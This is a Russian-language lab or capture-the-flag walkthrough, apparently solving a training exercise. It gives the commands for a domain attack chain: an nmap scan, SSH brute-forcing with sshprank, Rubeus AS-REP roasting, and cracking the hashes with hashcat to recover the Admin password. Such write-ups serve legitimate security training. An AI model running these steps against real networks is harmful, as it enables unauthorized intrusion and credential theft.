1.1. Сканируем сеть, узнаём ip-адрес контроллера домена и имя домена ($Domain_FQDN). <br>
``` sudo nmap --script whois-domain.nse 192.168.1.0/24 ``` <br>
2.1. Для определения список хостов в ssh-пранк запишем их с помощью регулярных выражений в файл: <br>
``` echo -e 192.168.{0..255}.{0..255}"\n" | sed 's/ //' > hosts.txt ``` <br>
2.2. Запуск sshprank: <br>
``` ./sshprank.py -b hosts.txt -u users.txt –p passwords.txt-v ``` <br>, где hosts.txt – список записанных хостов на предыдущем шаге, users.txt – список пользователей, которых дали по условию passwords.txt – список паролей, которые дали по условию v -- вывод подробной информации <br>
2.3 Логин и пароль должны подобраться, результат в owned.txt cat owned.txt <br>
3.1. Подключимся к PC1 по ssh с помощью найденный кред. <br>
3.2. Скачаем Rubeus с официального сайта на PC1 с официального сайта или сделаю переброску с kali с помощью scp .<br>
4.1. Используем Rubeus для атаки AS-REP roasting <br>
``` Rubeus.exe asreproast /outfile:$result_File ``` <br>
Примерный результат: <br>
![tolopogy](./img/img1.png) <br>
5.1. Возвращаемся на Kali и производим перебор паролей: <br>
``` hashcat -m 18200 $asrep_hashes_file $dict_file  ``` <br>
Найденный пароль пользователя Admin и есть ответ.
